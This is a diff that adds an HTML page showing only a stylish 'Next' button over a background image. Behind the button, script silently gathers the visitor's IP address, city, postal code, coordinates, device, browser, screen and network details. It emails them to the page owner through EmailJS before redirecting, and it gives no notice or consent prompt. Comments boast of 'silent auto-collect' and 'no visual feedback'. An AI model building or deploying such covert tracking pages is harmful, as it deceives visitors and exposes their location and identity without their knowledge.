@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Next | Glassy Auto-Collect</title>
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <style>
+        /* ---------- RESET & FULL BODY OVERRIDE ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            
+            /* REMOVE BLUE HIGHLIGHT ON ALL ELEMENTS */
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            outline: none;
+        }
+
+        /* Remove default focus ring for all interactive elements */
+        :focus, :active, :focus-visible, :focus-within {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        button, button:focus, button:active, a, div, span {
+            -webkit-tap-highlight-color: transparent !important;
+            outline: none !important;
+        }
+
+        body {
+            min-height: 100vh;
+            width: 100%;
+            background: #050a12;
+            
+            /* BACKGROUND: start.png fullscreen, no frames */
+            background-image: url('start.png');
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-attachment: fixed;
+            background-size: cover;
+            
+            /* Center button */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            
+            padding: 0;
+            margin: 0;
+            font-family: system-ui, 'Segoe UI', 'Inter', -apple-system, sans-serif;
+        }
+
+        /* ======================================================
+           ULTRA-GLASSY NEXT BUTTON WITH SHINING EFFECT + BUBBLE TOUCH EFFECT
+        ====================================================== */
+        .glassy-next-btn {
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(18px) saturate(180%);
+            -webkit-backdrop-filter: blur(18px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 80px;
+            font-size: 1.55rem;
+            font-weight: 580;
+            font-family: inherit;
+            letter-spacing: 0.8px;
+            color: rgba(255, 255, 255, 0.98);
+            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.2), 0 0 10px rgba(255,255,240,0.3);
+            padding: 0.9rem 2.8rem;
+            min-width: 170px;
+            cursor: pointer;
+            transition: all 0.28s cubic-bezier(0.15, 0.85, 0.35, 1.05);
+            text-align: center;
+            box-shadow: 0 10px 28px -6px rgba(0, 0, 0, 0.2),
+                        0 0 0 0.5px rgba(255, 255, 255, 0.2) inset,
+                        0 0 18px rgba(255, 255, 255, 0.25);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            appearance: none;
+            -webkit-appearance: none;
+            outline: none !important;
+        }
+        
+        /* BUBBLE TOUCH/EFFECT - RIPPLE/BUBBLE ANIMATION ON CLICK */
+        .glassy-next-btn {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .glassy-next-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.6);
+            transform: translate(-50%, -50%);
+            transition: width 0.4s ease-out, height 0.4s ease-out, opacity 0.4s ease-out;
+            pointer-events: none;
+            opacity: 0;
+        }
+        
+        .glassy-next-btn:active::after {
+            width: 200px;
+            height: 200px;
+            opacity: 0.5;
+            transition: 0s;
+        }
+        
+        /* Wait, better bubble effect using animation */
+        .bubble-active {
+            animation: bubbleRipple 0.4s ease-out forwards !important;
+        }
+        
+        @keyframes bubbleRipple {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+                opacity: 0.6;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(4);
+                opacity: 0;
+            }
+        }
+        
+        /* SHINING OVERLAY ANIMATION */
+        .glassy-next-btn::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                115deg,
+                rgba(255, 255, 255, 0) 10%,
+                rgba(255, 255, 255, 0.4) 45%,
+                rgba(255, 255, 255, 0.7) 50%,
+                rgba(255, 255, 255, 0.4) 55%,
+                rgba(255, 255, 255, 0) 90%
+            );
+            transform: rotate(25deg);
+            opacity: 0;
+            transition: opacity 0.2s ease;
+            pointer-events: none;
+            z-index: -1;
+            border-radius: 80px;
+        }
+        
+        .glassy-next-btn:hover::before {
+            opacity: 0.65;
+            animation: shine-slide 1.2s cubic-bezier(0.2, 0.9, 0.4, 1.1) forwards;
+        }
+        
+        @keyframes shine-slide {
+            0% {
+                transform: translateX(-30%) rotate(25deg);
+                opacity: 0;
+            }
+            20% {
+                opacity: 0.7;
+            }
+            80% {
+                opacity: 0.5;
+            }
+            100% {
+                transform: translateX(60%) rotate(25deg);
+                opacity: 0;
+            }
+        }
+        
+        .glassy-next-btn:hover {
+            background: rgba(255, 255, 255, 0.22);
+            backdrop-filter: blur(24px) saturate(200%);
+            border-color: rgba(255, 255, 255, 0.8);
+            transform: scale(1.03);
+            box-shadow: 0 18px 34px -10px rgba(0, 0, 0, 0.3),
+                        0 0 0 1px rgba(255, 255, 255, 0.4) inset,
+                        0 0 26px rgba(255, 240, 180, 0.5);
+        }
+        
+        .glassy-next-btn:active {
+            transform: scale(0.975);
+            background: rgba(255, 255, 255, 0.32);
+            backdrop-filter: blur(28px);
+            transition: 0.05s;
+        }
+        
+        @media (max-width: 640px) {
+            .glassy-next-btn {
+                font-size: 1.28rem;
+                padding: 0.7rem 2rem;
+                min-width: 150px;
+            }
+        }
+        
+        /* NO TOASTS - COMPLETELY REMOVED */
+        
+        ::-moz-focus-inner {
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ONLY BUTTON - NOTHING ELSE, NO TOASTS, NO MESSAGES -->
+    <button class="glassy-next-btn" id="nextBtn">Next</button>
+
+    <script>
+        (function() {
+            // ============================================
+            // EMAILJS CONFIGURATION - YOUR KEYS ARE SET!
+            // ============================================
+            const EMAILJS_CONFIG = {
+                PUBLIC_KEY: "Z1ra9H38Wjw3ZADCg",     // Your public key
+                SERVICE_ID: "service_n1oydnm",       // Your service ID
+                TEMPLATE_ID: "template_m4i1iv8"      // Your template ID
+            };
+            
+            // Initialize EmailJS
+            emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+            console.log("✅ EmailJS initialized with your keys");
+            
+            // Page load timestamp
+            const pageLoadTime = new Date();
+            
+            // Generate a random anonymous ID for this session
+            const sessionId = 'session_' + Math.random().toString(36).substr(2, 16);
+            
+            // ============================================
+            // COLLECT EVERY POSSIBLE DATA (AUTOMATIC, NO INPUT, NO VISUAL FEEDBACK)
+            // ============================================
+            async function collectAllData() {
+                const now = new Date();
+                const timeSpentSeconds = Math.floor((now - pageLoadTime) / 1000);
+                
+                // Basic info
+                const basicData = {
+                    session_id: sessionId,
+                    timestamp: now.toISOString(),
+                    local_time: now.toLocaleString(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezone_offset: new Date().getTimezoneOffset(),
+                    page_url: window.location.href,
+                    page_path: window.location.pathname,
+                    referrer: document.referrer || "direct",
+                    title: document.title,
+                };
+                
+                // Browser & Device
+                const deviceData = {
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(',') : '',
+                    cookie_enabled: navigator.cookieEnabled,
+                    do_not_track: navigator.doNotTrack,
+                    hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                    device_memory: navigator.deviceMemory || 'unknown',
+                    max_touch_points: navigator.maxTouchPoints,
+                    vendor: navigator.vendor || '',
+                };
+                
+                // Screen & Viewport
+                const screenData = {
+                    screen_width: screen.width,
+                    screen_height: screen.height,
+                    screen_avail_width: screen.availWidth,
+                    screen_avail_height: screen.availHeight,
+                    screen_color_depth: screen.colorDepth,
+                    window_width: window.innerWidth,
+                    window_height: window.innerHeight,
+                    device_pixel_ratio: window.devicePixelRatio || 1,
+                };
+                
+                // Network info
+                let networkData = {};
+                if (navigator.connection) {
+                    networkData = {
+                        connection_type: navigator.connection.effectiveType,
+                        downlink_mbps: navigator.connection.downlink,
+                        rtt_ms: navigator.connection.rtt,
+                        save_data: navigator.connection.saveData,
+                    };
+                } else {
+                    networkData = { connection_api: "not_supported" };
+                }
+                
+                // Performance
+                let perfData = {};
+                if (performance && performance.timing) {
+                    const timing = performance.timing;
+                    perfData = {
+                        page_load_ms: timing.loadEventEnd - timing.navigationStart,
+                        dom_ready_ms: timing.domContentLoadedEventEnd - timing.navigationStart,
+                    };
+                }
+                
+                // Behavior
+                const behaviorData = {
+                    time_on_page_seconds: timeSpentSeconds,
+                    click_timestamp: now.toISOString(),
+                };
+                
+                // Location via IP (free API)
+                let locationData = {};
+                try {
+                    const geoRes = await fetch('https://ipapi.co/json/', { 
+                        timeout: 3000 
+                    });
+                    if (geoRes.ok) {
+                        const geo = await geoRes.json();
+                        locationData = {
+                            ip: geo.ip,
+                            city: geo.city,
+                            region: geo.region,
+                            country: geo.country_name,
+                            country_code: geo.country_code,
+                            postal: geo.postal,
+                            latitude: geo.latitude,
+                            longitude: geo.longitude,
+                        };
+                    } else {
+                        locationData = { geo: "unavailable" };
+                    }
+                } catch (e) {
+                    locationData = { geo: "failed_or_blocked" };
+                }
+                
+                // Combine everything
+                return {
+                    ...basicData,
+                    ...deviceData,
+                    ...screenData,
+                    ...networkData,
+                    ...perfData,
+                    ...behaviorData,
+                    ...locationData,
+                    collected_at: now.toISOString(),
+                };
+            }
+            
+            // Send data via EmailJS (silent, no visual feedback)
+            async function sendData(data) {
+                try {
+                    // Prepare email parameters with ALL collected data
+                    const emailParams = {
+                        // Session & Time
+                        session_id: data.session_id,
+                        timestamp: data.timestamp,
+                        local_time: data.local_time,
+                        timezone: data.timezone,
+                        time_on_page_seconds: data.time_on_page_seconds,
+                        
+                        // Location
+                        ip_address: data.ip || 'unavailable',
+                        city: data.city || 'unknown',
+                        region: data.region || 'unknown',
+                        country: data.country || 'unknown',
+                        country_code: data.country_code || 'unknown',
+                        coordinates: data.latitude ? `${data.latitude},${data.longitude}` : 'unknown',
+                        
+                        // Device & Browser
+                        browser_os: data.user_agent,
+                        platform: data.platform,
+                        language: data.language,
+                        hardware_cores: data.hardware_concurrency,
+                        device_memory: data.device_memory,
+                        touch_points: data.max_touch_points,
+                        
+                        // Screen
+                        screen_resolution: `${data.screen_width}x${data.screen_height}`,
+                        device_pixel_ratio: data.device_pixel_ratio,
+                        window_size: `${data.window_width}x${data.window_height}`,
+                        
+                        // Network
+                        connection_type: data.connection_type || 'unknown',
+                        downlink_mbps: data.downlink_mbps || 'N/A',
+                        rtt_ms: data.rtt_ms || 'N/A',
+                        
+                        // Page Info
+                        page_url: data.page_url,
+                        referrer: data.referrer,
+                        page_load_ms: data.page_load_ms || 'N/A',
+                        
+                        // Summary
+                        summary: `🔹 Click | ${data.country || 'Unknown'} | ${data.city || 'Unknown'} | ${data.time_on_page_seconds}s on page | ${data.screen_width}x${data.screen_height} | ${data.connection_type || 'N/A'}`,
+                        
+                        // Full JSON data
+                        full_data_json: JSON.stringify(data, null, 2)
+                    };
+                    
+                    const response = await emailjs.send(
+                        EMAILJS_CONFIG.SERVICE_ID,
+                        EMAILJS_CONFIG.TEMPLATE_ID,
+                        emailParams
+                    );
+                    
+                    console.log("✅ Email sent successfully!", response);
+                    return true;
+                    
+                } catch (error) {
+                    console.error("❌ EmailJS error:", error);
+                    throw error;
+                }
+            }
+            
+            // Function to create bubble effect on the button
+            function createBubbleEffect(button, clientX, clientY) {
+                // Get button position
+                const rect = button.getBoundingClientRect();
+                const x = clientX - rect.left;
+                const y = clientY - rect.top;
+                
+                // Create bubble element
+                const bubble = document.createElement('span');
+                bubble.style.position = 'absolute';
+                bubble.style.left = x + 'px';
+                bubble.style.top = y + 'px';
+                bubble.style.width = '0';
+                bubble.style.height = '0';
+                bubble.style.borderRadius = '50%';
+                bubble.style.backgroundColor = 'rgba(255, 255, 255, 0.7)';
+                bubble.style.transform = 'translate(-50%, -50%)';
+                bubble.style.pointerEvents = 'none';
+                bubble.style.zIndex = '10';
+                bubble.style.animation = 'bubbleRipple 0.5s ease-out forwards';
+                
+                // Add animation keyframes if not already present
+                if (!document.querySelector('#bubble-keyframes')) {
+                    const styleSheet = document.createElement('style');
+                    styleSheet.id = 'bubble-keyframes';
+                    styleSheet.textContent = `
+                        @keyframes bubbleRipple {
+                            0% {
+                                width: 0;
+                                height: 0;
+                                opacity: 0.7;
+                            }
+                            100% {
+                                width: 200px;
+                                height: 200px;
+                                opacity: 0;
+                            }
+                        }
+                    `;
+                    document.head.appendChild(styleSheet);
+                }
+                
+                button.style.position = 'relative';
+                button.appendChild(bubble);
+                
+                // Remove bubble after animation
+                setTimeout(() => {
+                    if (bubble && bubble.parentNode) bubble.remove();
+                }, 500);
+            }
+            
+            // Get button element
+            const nextBtn = document.getElementById('nextBtn');
+            let isProcessing = false;
+            
+            // ON CLICK: Auto-collect everything & send, show bubble effect, then navigate to Next.html
+            nextBtn.addEventListener('click', async (event) => {
+                // Get click coordinates for bubble effect
+                let clientX, clientY;
+                if (event.touches) {
+                    // Touch event
+                    clientX = event.touches[0].clientX;
+                    clientY = event.touches[0].clientY;
+                } else {
+                    // Mouse event
+                    clientX = event.clientX;
+                    clientY = event.clientY;
+                }
+                
+                // Create bubble effect at click/touch position
+                createBubbleEffect(nextBtn, clientX, clientY);
+                
+                if (isProcessing) return;
+                isProcessing = true;
+                
+                try {
+                    // Collect ALL possible data automatically
+                    const allData = await collectAllData();
+                    
+                    // Send via EmailJS (silent)
+                    await sendData(allData);
+                    
+                    console.log("Data sent successfully for session:", sessionId);
+                    
+                    // Small delay to ensure email sends before navigation (100ms is enough)
+                    setTimeout(() => {
+                        // Navigate to Next.html
+                        window.location.href = "Next.html";
+                    }, 100);
+                    
+                } catch (error) {
+                    console.error("Collection/send error:", error);
+                    // Even if error occurs, still navigate to Next.html
+                    setTimeout(() => {
+                        window.location.href = "Next.html";
+                    }, 100);
+                } finally {
+                    isProcessing = false;
+                }
+            });
+            
+            // Also handle touchstart for better mobile bubble effect without preventing default
+            nextBtn.addEventListener('touchstart', (event) => {
+                // Just to ensure bubble works on touch, no other changes
+                // We don't prevent default to maintain click event
+            });
+            
+            // Background image check (silent, console only)
+            const imgTest = new Image();
+            imgTest.onerror = () => console.warn("⚠️ start.png not found - please add the image file");
+            imgTest.onload = () => console.log("✅ start.png background loaded");
+            imgTest.src = "start.png";
+            
+            // Remove all outlines globally
+            const style = document.createElement('style');
+            style.textContent = '*:focus, *:active, *:focus-visible { outline: none !important; box-shadow: none !important; }';
+            document.head.appendChild(style);
+            
+            console.log("✨ Glassy Next is LIVE | Silent auto-collect | Bubble touch effect | Navigates to Next.html | EmailJS active");
+        })();
+    </script>
+</body>
+</html>
